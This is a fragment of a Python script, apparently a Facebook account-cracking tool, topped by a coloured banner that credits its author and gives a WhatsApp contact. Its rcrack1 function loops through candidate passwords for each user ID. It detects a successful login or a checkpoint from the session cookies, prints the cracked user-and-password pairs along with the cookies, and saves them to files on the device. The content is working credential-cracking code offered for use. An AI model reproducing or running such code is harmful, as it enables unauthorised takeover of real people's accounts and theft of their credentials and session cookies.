...
\033[1;35m /$$  \ $$| $$  | $$| $$\  $$$| $$  | $$
\033[1;36m|  $$$$$$/| $$  | $$| $$ \  $$| $$  | $$
\033[1;33m \______/ |__/  |__/|__/  \__/|__/  |__/
                                                                                                                                       
╔═════════════════════════════════════════════╗
║  [+] AUTHOR   : SARDAR DANISH         ║
║  [+] WHATSAPP : +923463299102              ║
║  [+] TEAM     : SARDAR      ║
║  [+] CREATOR  : SARDAR DANISH                     ║
║  [+] VERSION  : 9.0                       ║
╚═════════════════════════════════════════════╝""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mSANA\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SANA-OK] {uid}|{ps}")
                print(f" \n Cookie : {coki}")
                print(f" \n ══════════════════════════════════════════")
                open('/sdcard/SANA/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SANA-CP] {uid}|{ps}")
                open('/sdcard/SANA-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SANA] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
